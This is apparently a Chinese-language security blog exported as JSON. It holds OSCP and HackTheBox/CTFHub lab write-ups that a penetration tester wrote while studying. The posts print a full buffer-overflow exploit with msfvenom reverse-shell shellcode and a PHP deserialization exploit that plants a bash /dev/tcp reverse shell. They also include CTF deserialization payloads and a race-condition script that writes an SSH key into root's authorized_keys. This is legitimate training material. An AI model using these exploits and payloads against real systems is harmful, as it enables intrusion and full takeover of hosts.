{"meta":{"title":"C0debreak's Blog","subtitle":null,"description":null,"author":"P0tato","url":"http://yoursite.com","root":"/"},"pages":[{"title":"","date":"2021-05-25T15:37:15.543Z","updated":"2021-05-25T15:37:15.543Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"目前从事渗透测试方向 Hack the Box爱好者 目前正在准备OSCP，希望一切顺利~ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"categories","date":"2020-06-09T15:39:50.000Z","updated":"2020-06-09T15:40:26.501Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-06-09T15:39:43.000Z","updated":"2020-06-09T15:41:19.853Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"OSCP 缓冲区溢出练习","slug":"OSCP 缓冲区溢出练习","date":"2021-08-25T15:02:15.322Z","updated":"2021-08-25T16:03:40.483Z","comments":true,"path":"2021/08/25/OSCP 缓冲区溢出练习/","link":"","permalink":"http://yoursite.com/2021/08/25/OSCP 缓冲区溢出练习/","excerpt":"Brainpan0x00 准备工作下载Immunity Debugger，安装mona插件(drop mona.py into the ‘PyCommands’ folder): https://github.com/corelan/mona 下载待测试程序： https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice","text":"Brainpan0x00 准备工作下载Immunity Debugger，安装mona插件(drop mona.py into the ‘PyCommands’ folder): https://github.com/corelan/mona 下载待测试程序： https://github.com/freddiebarrsmith/Buffer-Overflow-Exploit-Development-Practice 0x01 寻找溢出点直接运行brainpan.exe和自带的brainpan.py文件，可以看到程序在输入900字符后崩溃。 我们使用cyclic生成1000字符的payload，填充到buffer的位置： 我们在Immunity Debugger中调试，F9运行后重新跑下Python脚本： 可以看到程序崩溃了，并且EIP的地址为0x66616167。我们在cyclic中查找溢出位置： 确认溢出位置为524。 0x02 寻找坏字符我们先验证下之前寻找的溢出点是正确的，修改buffer为\"A\"*524 + \"B\"*4，ctrl+F2重新调试： EIP的值为我们控制的BBBB，继续寻找坏字符，继续重新调试，在python脚本中添加badchars： 程序崩溃后选择ESP寄存器，右键Follow in dump即可看到我们输入的badchars，范围从0x01 ~ 0xFF，0x00默认为坏字符: 由上图可知，这道题目中我们的坏字符即为0x00，在生成最终的payload时需要排除。 0x03 寻找jmp esp因为需要跳转到我们的ESP，所以我们需要一条jmp esp的指令，可以使用mona模块来进行寻找： 12!mona modules!mona find -s \"\\xff\\xe4\" -m 根据第一条命令，我们进一步在brainpan.exe中寻找： jmp esp的地址即为0x311712f3。 0x04 生成shellcode我们一般使用msfvenom来生成shellcode，命令如下： 1msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=80 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b \"\\x00\" 0x05 生成最终exp根据上面的信息，我们最终修改可以得到最终的exp: 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/pythonimport socket# create an array of buffers, while increasing them.shellcode = \"\\xba\\xfe\\x91\\x1f\\x60\\xd9\\xe1\\xd9\\x74\\x24\\xf4\\x5b\\x29\\xc9\\xb1\"\"\\x52\\x83\\xc3\\x04\\x31\\x53\\x0e\\x03\\xad\\x9f\\xfd\\x95\\xad\\x48\\x83\"\"\\x56\\x4d\\x89\\xe4\\xdf\\xa8\\xb8\\x24\\xbb\\xb9\\xeb\\x94\\xcf\\xef\\x07\"\"\\x5e\\x9d\\x1b\\x93\\x12\\x0a\\x2c\\x14\\x98\\x6c\\x03\\xa5\\xb1\\x4d\\x02\"\"\\x25\\xc8\\x81\\xe4\\x14\\x03\\xd4\\xe5\\x51\\x7e\\x15\\xb7\\x0a\\xf4\\x88\"\"\\x27\\x3e\\x40\\x11\\xcc\\x0c\\x44\\x11\\x31\\xc4\\x67\\x30\\xe4\\x5e\\x3e\"\"\\x92\\x07\\xb2\\x4a\\x9b\\x1f\\xd7\\x77\\x55\\x94\\x23\\x03\\x64\\x7c\\x7a\"\"\\xec\\xcb\\x41\\xb2\\x1f\\x15\\x86\\x75\\xc0\\x60\\xfe\\x85\\x7d\\x73\\xc5\"\"\\xf4\\x59\\xf6\\xdd\\x5f\\x29\\xa0\\x39\\x61\\xfe\\x37\\xca\\x6d\\x4b\\x33\"\"\\x94\\x71\\x4a\\x90\\xaf\\x8e\\xc7\\x17\\x7f\\x07\\x93\\x33\\x5b\\x43\\x47\"\"\\x5d\\xfa\\x29\\x26\\x62\\x1c\\x92\\x97\\xc6\\x57\\x3f\\xc3\\x7a\\x3a\\x28\"\"\\x20\\xb7\\xc4\\xa8\\x2e\\xc0\\xb7\\x9a\\xf1\\x7a\\x5f\\x97\\x7a\\xa5\\x98\"\"\\xd8\\x50\\x11\\x36\\x27\\x5b\\x62\\x1f\\xec\\x0f\\x32\\x37\\xc5\\x2f\\xd9\"\"\\xc7\\xea\\xe5\\x4e\\x97\\x44\\x56\\x2f\\x47\\x25\\x06\\xc7\\x8d\\xaa\\x79\"\"\\xf7\\xae\\x60\\x12\\x92\\x55\\xe3\\x62\\x63\\x55\\xf2\\xf4\\x61\\x55\\xf4\"\"\\x54\\xef\\xb3\\x9e\\x44\\xb9\\x6c\\x37\\xfc\\xe0\\xe6\\xa6\\x01\\x3f\\x83\"\"\\xe9\\x8a\\xcc\\x74\\xa7\\x7a\\xb8\\x66\\x50\\x8b\\xf7\\xd4\\xf7\\x94\\x2d\"\"\\x70\\x9b\\x07\\xaa\\x80\\xd2\\x3b\\x65\\xd7\\xb3\\x8a\\x7c\\xbd\\x29\\xb4\"\"\\xd6\\xa3\\xb3\\x20\\x10\\x67\\x68\\x91\\x9f\\x66\\xfd\\xad\\xbb\\x78\\x3b\"\"\\x2d\\x80\\x2c\\x93\\x78\\x5e\\x9a\\x55\\xd3\\x10\\x74\\x0c\\x88\\xfa\\x10\"\"\\xc9\\xe2\\x3c\\x66\\xd6\\x2e\\xcb\\x86\\x67\\x87\\x8a\\xb9\\x48\\x4f\\x1b\"\"\\xc2\\xb4\\xef\\xe4\\x19\\x7d\\x0f\\x07\\x8b\\x88\\xb8\\x9e\\x5e\\x31\\xa5\"\"\\x20\\xb5\\x76\\xd0\\xa2\\x3f\\x07\\x27\\xba\\x4a\\x02\\x63\\x7c\\xa7\\x7e\"\"\\xfc\\xe9\\xc7\\x2d\\xfd\\x3b\"buffer = \"A\"*524 + \"\\xf3\\x12\\x17\\x31\" + \"\\x90\"*50 + shellcodeprint \"Fuzzing PASS with %s bytes\" % len(buffer)s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect = s.connect(('127.0.0.1', 9999))s.recv(1024)s.send(buffer + '\\r\\n')s.close() 在本地监听80端口： 运行程序后再次运行exp脚本，反弹shell成功： document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"oscp","slug":"oscp","permalink":"http://yoursite.com/categories/oscp/"}],"tags":[{"name":"oscp","slug":"oscp","permalink":"http://yoursite.com/tags/oscp/"}]},{"title":"CTFHUB练习-web","slug":"CTFHUB练习-web","date":"2021-08-22T17:06:01.373Z","updated":"2021-08-22T17:07:15.741Z","comments":true,"path":"2021/08/23/CTFHUB练习-web/","link":"","permalink":"http://yoursite.com/2021/08/23/CTFHUB练习-web/","excerpt":"0x00 逆转思维 浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维（php伪协议、反序列化）","text":"0x00 逆转思维 浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维（php伪协议、反序列化） 1234567891011121314151617$text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo file_get_contents($text,'r'); if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);} 题目直接给出php源码，GET请求了3个参数，有一些校验。首先第一个参数text需要file_get_contents($text,'r')===\"welcome to the zjctf\"，因为file_get_contents为将整个文件读入一个字符串，如果直接传入字符串则无法读出。 这里可以使用伪协议来进行传入字符串，plain或者base64均可： 12?text=data://text/plain,welcome%20to%20the%20zjctf?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 第二个参数file为我们想要读取的文件，这里限制了不能包含flag，所以我们没法直接读取flag.php文件。提示中包含useless.php，我们先用php://filter/read=convert.base64-encode/resource=读取文件 1?text=data://text/plain,welcome%20to%20the%20zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php&password=1 base64解码可得代码如下： 123456789class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this->file)){ echo file_get_contents($this->file); return (\"U R SO CLOSE !///COME ON PLZ\"); } } } 第三个参数为password，useless.php中Flag类有魔术方法__tostring，存在反序列化漏洞，构造payload如下： 123456789101112class Flag{ //flag.php public $file='flag.php'; public function __tostring(){ if(isset($this->file)){ echo file_get_contents($this->file); return (\"U R SO CLOSE !///COME ON PLZ\"); } }}$test =new Flag;echo serialize($test); 得到序列化后的json串：O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}，拼接到password参数，查看页面源代码获得flag。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"CTFHUB","slug":"CTFHUB","permalink":"http://yoursite.com/categories/CTFHUB/"}],"tags":[{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"}]},{"title":"Hackthebox--Sink","slug":"Hackthebox--Sink","date":"2021-07-21T17:06:48.844Z","updated":"2021-08-20T15:22:30.682Z","comments":true,"path":"2021/07/22/Hackthebox--Sink/","link":"","permalink":"http://yoursite.com/2021/07/22/Hackthebox--Sink/","excerpt":"文章首发于安全客: https://www.anquanke.com/post/id/247560#h2-17 0x00 题目介绍Sink是HackTheBox上一道难度是insane的Linux靶机，做了很久HackTheBox，第一次做insane难度的，还是学到了很多东西的，在这里跟大家分享一下。 题目主要涉及到的知识点是： HAProxy HTTP request smuggling (CVE-2019-18277) Git commit log AWS CLI Configure","text":"文章首发于安全客: https://www.anquanke.com/post/id/247560#h2-17 0x00 题目介绍Sink是HackTheBox上一道难度是insane的Linux靶机，做了很久HackTheBox，第一次做insane难度的，还是学到了很多东西的，在这里跟大家分享一下。 题目主要涉及到的知识点是： HAProxy HTTP request smuggling (CVE-2019-18277) Git commit log AWS CLI Configure 0x01 Port Scan123456789101112131415161718192021222324252627282930313233343536373839404142434445464748└─# nmap -sC -sV -oA sink 10.129.71.3Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 00:00 CSTNmap scan report for 10.129.71.3Host is up (0.26s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)3000/tcp open ppp?| fingerprint-strings: | GenericLines, Help: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 200 OK| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=7d01b54d4b74326b; Path=/; HttpOnly| Set-Cookie: _csrf=fzBuPyYXciKNMjoU74_PH6UmsMU6MTYyNTUwMDg1NzUxOTkyOTA4OQ; Path=/; Expires=Tue, 06 Jul 2021 16:00:57 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Mon, 05 Jul 2021 16:00:57 GMT| HTTPOptions: | HTTP/1.0 404 Not Found| Content-Type: text/html; charset=UTF-8| Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647| Set-Cookie: i_like_gitea=5a24776cc4ce15ce; Path=/; HttpOnly| Set-Cookie: _csrf=Naj5fDxJz0wmhymfl7zrTjDvfrI6MTYyNTUwMDg2NDgyNDg1NDY3MQ; Path=/; Expires=Tue, 06 Jul 2021 16:01:04 GMT; HttpOnly| X-Frame-Options: SAMEORIGIN| Date: Mon, 05 Jul 2021 16:01:04 GMT| | | | | | | Page Not Found - Gitea: Git with a cup of tea | | | |_ { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/categories/Hackthebox/"}],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/tags/Hackthebox/"}]},{"title":"Hackthebox--Tenet","slug":"Hackthebox--Tenet","date":"2021-05-25T13:51:02.808Z","updated":"2021-06-16T16:33:26.492Z","comments":true,"path":"2021/05/25/Hackthebox--Tenet/","link":"","permalink":"http://yoursite.com/2021/05/25/Hackthebox--Tenet/","excerpt":"0x00 信息收集依旧使用nmap进行端口扫描和服务识别： 12345678910111213141516171819┌──(root💀kali)-[/home/fnut/tenet]└─# nmap -sC -sV -oA tenet 10.129.150.173Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 09:12 EDTNmap scan report for 10.129.150.173Host is up (0.26s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)| 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)|_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds 1234部分参数说明-sC 根据端口识别的服务，调用默认脚本-sV 开放版本探测-oA 可以将扫描结果以标准格式、XML格式和Grep格式一次性输出 只开放了22和80端口，80端口的web服务使我们首先需要关注的，80端口打开为Apache默认页面。","text":"0x00 信息收集依旧使用nmap进行端口扫描和服务识别： 12345678910111213141516171819┌──(root💀kali)-[/home/fnut/tenet]└─# nmap -sC -sV -oA tenet 10.129.150.173Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-25 09:12 EDTNmap scan report for 10.129.150.173Host is up (0.26s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)| 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)|_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds 1234部分参数说明-sC 根据端口识别的服务，调用默认脚本-sV 开放版本探测-oA 可以将扫描结果以标准格式、XML格式和Grep格式一次性输出 只开放了22和80端口，80端口的web服务使我们首先需要关注的，80端口打开为Apache默认页面。 使用gobuster爆破一下目录： 12345678910111213141516171819202122232425┌──(root💀kali)-[/home/fnut/tenet]└─# gobuster dir -e -u http://10.129.150.173 -w /usr/share/dirb/wordlists/common.txt -t 100 2 ⨯===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://10.129.150.173[+] Threads: 100[+] Wordlist: /usr/share/dirb/wordlists/common.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Expanded: true[+] Timeout: 10s===============================================================2021/05/25 09:31:19 Starting gobuster===============================================================http://10.129.150.173/.htpasswd (Status: 403)http://10.129.150.173/.htaccess (Status: 403)http://10.129.150.173/.hta (Status: 403)http://10.129.150.173/index.html (Status: 200)http://10.129.150.173/server-status (Status: 403)http://10.129.150.173/wordpress (Status: 301)===============================================================2021/05/25 09:31:36 Finished=============================================================== 123-u url 指定主机-w wordlist 指定字典-e 打印全部url路径 可以看到有一个http://10.129.150.173/wordpress，先在/etc/hosts中添加相关解析： 1echo \"10.129.150.173 tenet.htb\" >>/etc/hosts 查看正常解析的页面。 0x01 寻找漏洞点正常的web服务我们都可以使用nikto进行扫描，查看是否有已知漏洞(速度比较慢，可以开着慢慢跑)。在tenet.htb页面上我们发现了一条可疑的评论： 评论提示我们网站正在迁移，有一个sator.php文件和备份文件，同样添加/etc/hosts后进行访问： 提示了一些信息，我们直接获取备份文件sator.php.bak，审计下php文件源码： 123456789101112131415161718192021222324252627282930 data = 'Success'; } public function __destruct() { file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data); echo '[] Database updated '; // echo 'Gotta get this working properly...'; }}$input = $_GET['arepo'] ?? '';$databaseupdate = unserialize($input);$app = new DatabaseExport;$app -> update_db();?> 可以看到，源码中针对获取到的arepo参数的值进行了反序列化，并且在DatabaseExport类中定义了魔术方法__destruct()，所以我们的关注重点就放在这里存在的php反序列化漏洞。 0x02 漏洞分析sator.php源码中对arepo获取到的参数进行了反序列化，并且没有做任何限制。在sator.php中的DatabaseExport类定义了魔术方法，并且调用了file_put_contents()将data中的数据写到user_file中。 反序列化对象会在不同场景调用不同的魔术方法： 123456789__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发 因此如果我们构造恶意的user_file和data数据传入到arepo参数，就可以控制反序列化函数在调用__destruct()时执行恶意操作写shell文件。 根据sator.php源码构造exp.php如下： 123456789101112131415161718192021/dev/tcp/10.10.14.9/4444 0>&1\\'\");?>'; public function __destruct() { file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data); echo '[] Database updated '; // echo 'Gotta get this working properly...'; }}$url = 'http://10.129.150.173/sator.php?arepo=';$url = $url . urlencode(serialize(new DatabaseExport));$response = file_get_contents(\"$url\");$response = file_get_contents(\"http://10.129.150.173/shell.php\");?> 在本地执行机上执行exp.php会重写DatabaseExport类中的user_file和data数据，并且将新的DatabaseExport对象序列化并url编码传给arepo参数。 在反序列化调用__destruct()魔术方法时，将payload写到了当前路径下的shell.php中。因此第一次file_get_contents()访问构造好的url在靶机后台写入exp文件。第二次调用时访问shell文件，获得反向shell。 123456┌──(root💀kali)-[/home/fnut/tenet]└─# nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.14.9] from (UNKNOWN) [10.129.150.173] 27444iduid=33(www-data) gid=33(www-data) groups=33(www-data) 0x03 权限提升反向shell获得了www-data权限的shell，可以通过python获得完全交互式的tty： 1python3 -c \"import pty;pty.spawn('/bin/bash')\" 先查看下当前用户拥有的具有bash权限的用户，查看/etc/passwd并使用vim指令优化： 12root:x:0:0:root:/root:/bin/bashneil:x:1001:1001:neil,,,:/home/neil:/bin/bash 12345:g/str/d: 表示后面输入的为vim指令g 表示范围为全局str 匹配的字符串d delete 表示删除 很明显neil用户是我们的目标，netstat查看当前占用的端口： 1234567www-data@tenet:/var/www/html$ netstat -antup netstat -antup(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - 3306端口为mysql数据库端口。查找web服务相关配置文件： 123456789www-data@tenet:/var/www/html$ cd /etc/apache2cd /etc/apache2www-data@tenet:/etc/apache2$ grep -Ri DocumentRoot grep -Ri DocumentRootsites-available/default-ssl.conf: DocumentRoot /var/www/htmlsites-available/tenet.htb.conf: DocumentRoot /var/www/html/wordpresssites-available/000-default.conf: DocumentRoot /var/www/htmlsites-enabled/tenet.htb.conf: DocumentRoot /var/www/html/wordpresssites-enabled/000-default.conf: DocumentRoot /var/www/html 继续在/var/www/html路径下查找，根据用户名搜索： 123www-data@tenet:/var/www/html$ grep -Ri neilgrep -Ri neilwordpress/wp-config.php:define( 'DB_USER', 'neil' ); 在wp-config.php文件中发现了数据库密码： 12345define( 'DB_NAME', 'wordpress' );define( 'DB_USER', 'neil' );define( 'DB_PASSWORD', 'Opera2112' );define( 'DB_HOST', 'localhost' );define( 'DB_CHARSET', 'utf8mb4' ); 猜测存在密码重用，使用该密码可以成功切换到neil用户，成功获得第一个flag：user.txt： 1234567891011121314151617181920www-data@tenet:/var/www/html$ su neilsu neilPassword: Opera2112neil@tenet:/var/www/html$ ididuid=1001(neil) gid=1001(neil) groups=1001(neil)neil@tenet:/var/www/html$ ll ~/ll ~/total 36drwxr-xr-x 5 neil neil 4096 Jan 7 10:06 ./drwxr-xr-x 3 root root 4096 Dec 17 09:33 ../lrwxrwxrwx 1 neil neil 9 Dec 17 10:53 .bash_history -> /dev/null-rw-r--r-- 1 neil neil 220 Dec 16 15:00 .bash_logout-rw-r--r-- 1 neil neil 3771 Dec 16 15:00 .bashrcdrwx------ 2 neil neil 4096 Dec 17 10:51 .cache/drwx------ 3 neil neil 4096 Dec 17 10:51 .gnupg/drwxrwxr-x 3 neil neil 4096 Dec 17 10:52 .local/-rw-r--r-- 1 neil neil 807 Dec 16 15:00 .profile-r-------- 1 neil neil 33 May 25 13:01 user.txt 0x04 获取rootsudo -l查看可以以root权限运行且不需要密码的脚本： 12345678neil@tenet:/var/www/html$ sudo -lsudo -lMatching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh 查看下脚本内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/bin/bashcheckAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \" \" -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \"Successfully added $sshName to authorized_keys file!\" else /bin/echo \"Error in adding $sshName to authorized_keys file!\" fi}checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \"Error in creating key file!\" if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi}addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key >>$tmpName checkFile $tmpName /bin/cat $tmpName >>/root/.ssh/authorized_keys /bin/rm $tmpName}key=\"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\"addKeycheckAdded 查看这个文件，addkey的功能就是将/tmp/ssh-XXXXXXXX复制写入到/root/.ssh/authorized_keys，那么我们可以考虑条件竞争，将我们自己的公钥写入到/tmp/ssh-XXXXXXXX，从而将我们自己的公钥写入到/root/.ssh/authorized_keys。这样我们就可以直接通过ssh连接目标靶机。 现在本地生成我们的ssh公私钥对： 1ssh-keygen -t rsa 根据生成的公钥输出最后的exp.sh： 1234while Truedoecho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8LdB/wgH3U3AZEA3zuz3QFRz0gXo/8BpoTpSzPopPFbSFbqlCbURIjoJdgDUDuGl0H/WJWL7I2fcSFlVfeybg4+DiR8gfTe2HeDbMVEKlexr+VwnHWSf35nFRHuyEE91nyUi43JeAbeL3Ux1TxsRfffOKNDw7cGqSnGRtJAch8XSkHRqo2m3pVjBN8iN9FWg+LJ0lzuqwZa3U7VeReZZj5TW8a5Gnz3fzX4TK1o0s72vhWU69RA/IYFwYmegn1LeBhWhIBClk2rPjoQcfkLceX3sfm5bKfhJqsc9JzkLR5XsZz6j7Yb7ZfssFaoaylYvDBmebK2VdsOp/aCJSLGH0oEVv5cXoR64M8u9jwIjXfDxt4UXWQY0DAOKCTQ5BMgpT5b2dpUHIEOrzoYr0+xZM2lwSF8zxFgCx1rkrLREfMsEQGcFRmQwAULCXIrqGylV2agDQfuWzsVfQklN/KSuPH3a0oPlXII0fFds4q3NbC+BrVsY72Zg5JvNlakd0qzs= root@kali\" |tee /tmp/ssh-*done 另一个shell持续调用/usr/local/bin/enableSSH.sh： 12sudo /usr/local/bin/enableSSH.shSuccessfully added root@ubuntu to authorized_keys file! 条件竞争成功后即可以直接ssh连接靶机： 1234567891011121314151617181920212223└─# ssh root@10.129.150.173 130 ⨯Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue May 25 15:10:19 UTC 2021 System load: 0.03 Processes: 191 Usage of /: 15.1% of 22.51GB Users logged in: 0 Memory usage: 10% IP address for ens160: 10.129.150.173 Swap usage: 0%53 packages can be updated.31 of these updates are security updates.To see these additional updates run: apt list --upgradableLast login: Thu Feb 11 14:37:46 2021root@tenet:~# iduid=0(root) gid=0(root) groups=0(root) Done!~ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/categories/Hackthebox/"}],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/tags/Hackthebox/"}]},{"title":"Hackthebox--The notebook","slug":"Hackthebox--Thenotebook","date":"2021-04-26T16:45:23.596Z","updated":"2021-04-27T14:05:53.017Z","comments":true,"path":"2021/04/27/Hackthebox--Thenotebook/","link":"","permalink":"http://yoursite.com/2021/04/27/Hackthebox--Thenotebook/","excerpt":"0x00 信息收集使用nmap扫描，发现80端口开放，暂且先不管10010端口 12345678910111213141516171819┌──(root💀kali)-[/home/fnut/notebook]└─# nmap -sC -sV -oA notebook 10.129.120.189Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-27 22:26 EDTNmap scan report for 10.129.120.189Host is up (0.22s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)| 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_ 256 